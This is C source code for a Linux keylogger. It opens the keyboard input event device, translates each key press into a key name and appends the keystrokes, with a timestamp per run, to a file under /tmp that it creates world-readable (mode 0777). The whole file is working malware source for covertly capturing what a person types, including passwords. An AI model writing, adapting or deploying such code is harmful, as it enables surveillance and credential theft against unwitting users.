#include "keylog.h"
#include "find_event_file.h"

const char *keycodes[] = {

	"RESERVED","ESC","1","2","3","4","5","6","7","8","9","0","MINUS","EQUAL","BACKSPACE","TAB","Q","W","E","R","T","Y","U","I","O","P","LEFTBRACE","RIGHTBRACE","ENTER","LEFTCTRL","A","S","D","F","G","H","J","K","L","SEMICOLON","APOSTROPHE","GRAVE","LEFTSHIFT","BACKSLASH","Z","X","C","V","B","N","M","COMMA","DOT","SLASH","RIGHTSHIFT","KPASTERISK","LEFTALT","SPACE","CAPSLOCK","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","NUMLOCK",
"SCROLLLOCK"

};

char *spechialKey[] = 
{
	"RESERVED","ESC","MINUS","EQUAL","BACKSPACE","TAB","LEFTBRACE","RIGHTBRACE","ENTER","LEFTCTRL","SEMICOLON","APOSTROPHE","GRAVE","LEFTSHIFT","BACKSLASH","COMMA","DOT","SLASH","RIGHTSHIFT","KPASTERISK","LEFTALT","SPACE","CAPSLOCK","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","NUMLOCK",
"SCROLLLOCK"
};

int loop = 1;

void sigint_handler(int sig){
    loop = 0;
}


int write_all(int fd, const char *str)
{
	int bytesWritten = 0;
	int byteToWrite = strlen(str) + 1;



	do
	{
		bytesWritten = write(fd, str, byteToWrite);
		if(bytesWritten == - 1)
			return 0;

		byteToWrite -= bytesWritten;
		str += bytesWritten;
	}
	while(byteToWrite > 0);

	return 1;
}

/**
 * Wrapper around write_all which exits safely if the write fails, without
 * the SIGPIPE terminating the program abruptly.
 */
void safe_write_all(int fd, const char* str, int keyboard)
{
	struct sigaction new_actn, old_actn;
	//signal generate when user press ctrl + c to terminate the program
	new_actn.sa_handler = SIG_IGN; 
    sigemptyset(&new_actn.sa_mask);
	new_actn.sa_flags = 0;

	sigaction(SIGPIPE, &new_actn, &old_actn);

	if (!write_all(fd, str))
	{
		close(fd);
		close(keyboard);
		perror("\n writting");
		exit(1);
	}
	sigaction(SIGPIPE, &old_actn, NULL);
}

bool checkSpechialCharacter(const char* x)
{
	for(int ii = 0; ii < 35; ii++)
		{
			if(x == spechialKey[ii])
				return true;
		}
	return false;

}


void keyLogger()
{
	int keyboard; 
	int writeout;

	int eventSize = sizeof(struct input_event);
	int bytesRead = 0;
	struct input_event events[NUM_EVENTS];
	int i;

	time_t t;
	char output[50] = "/tmp/kilocgo/kilocgo.txt";


	char* KEYBOARD_DEVICE = get_keyboard_event_file();
	if(!KEYBOARD_DEVICE)
		exit(0);
	
	if ((writeout = open(output, O_RDWR|O_APPEND|O_CREAT, 0777)) < 0)
	{
		printf("Error open file : %s\n", strerror(errno));
		return;
	}


   	if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
        printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
        return;
    }	

    //log thoi gian moi khi keylog duoc chay 
    time(&t);
    write(writeout, ctime(&t), strlen(ctime(&t)));
    write(writeout, "\n", strlen("\n"));



	signal(SIGINT, sigint_handler);

	while(loop)
	{
		bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);

		for (i = 0; i < (bytesRead / eventSize); ++i)
		{
			if(events[i].type == EV_KEY)
			{
				if(events[i].value == 1)
				{
					if(events[i].code > 0 && events[i].code < NUM_KEYCODES)
					{	
						if(events[i].code == KEY_ENTER)
						{
							safe_write_all(writeout," ", keyboard);
							safe_write_all(writeout, keycodes[events[i].code], keyboard);
							safe_write_all(writeout," ", keyboard);
							safe_write_all(writeout, "\n", keyboard);

						}
						
						else if(checkSpechialCharacter(keycodes[events[i].code]) == true)
						{
							safe_write_all(writeout," ", keyboard);
							safe_write_all(writeout, keycodes[events[i].code], keyboard);
							safe_write_all(writeout," ", keyboard);

						}
						else
							safe_write_all(writeout, keycodes[events[i].code], keyboard);
						//safe_write_all(writeout, "", keyboard);
						
					}
					else
					{
							write(writeout, "UNRECONIZE", strlen("UNRECONIZE"));
					}
				}	
			}
		}
	}
	if(bytesRead > 0) 
		safe_write_all(writeout, "\n", keyboard);

 	write(writeout, "--------------------------------------------------------------------------------------------------------------------------", strlen("--------------------------------------------------------------------------------------------------------------------------"));
 	write(writeout, "\n", strlen("\n"));
 	write(writeout, "\n", strlen("\n"));
	write(writeout, "\n", strlen("\n"));
 	write(writeout, "\n", strlen("\n"));
 	write(writeout, "\n", strlen("\n"));



	close(keyboard);
	close(writeout);
	free(KEYBOARD_DEVICE);

}


